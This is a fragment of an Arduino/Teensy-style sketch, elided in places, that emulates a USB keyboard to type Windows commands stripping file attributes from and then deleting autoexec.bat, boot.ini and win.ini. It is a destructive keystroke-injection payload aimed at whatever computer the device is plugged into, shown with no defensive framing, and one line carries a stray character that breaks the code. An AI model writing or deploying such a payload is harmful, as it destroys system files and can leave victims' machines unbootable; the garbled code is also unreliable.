...
void setup()
{
  ...
  delay(1000);
  Keyboard.print("attrib -r -s -h c:\\autoexec.bat");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
  ...
  delay(1000);
  Keyboard.print("del c:\\autoexec.bat");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
  ...
  delay(1000);
  Keyboard.print("attrib -r -s -h c:\\boot.ini");
  Keyboard.set_key1(KEY_ENTER);e
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();

  delay(1000);
  Keyboard.print("del c:\\boot.ini");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
  ...
  delay(1000);
  Keyboard.print("attrib -r -s -h c:\\windows\\win.ini");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
  ...
  delay(1000);
  Keyboard.print("del c:\\windows\\win.ini");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
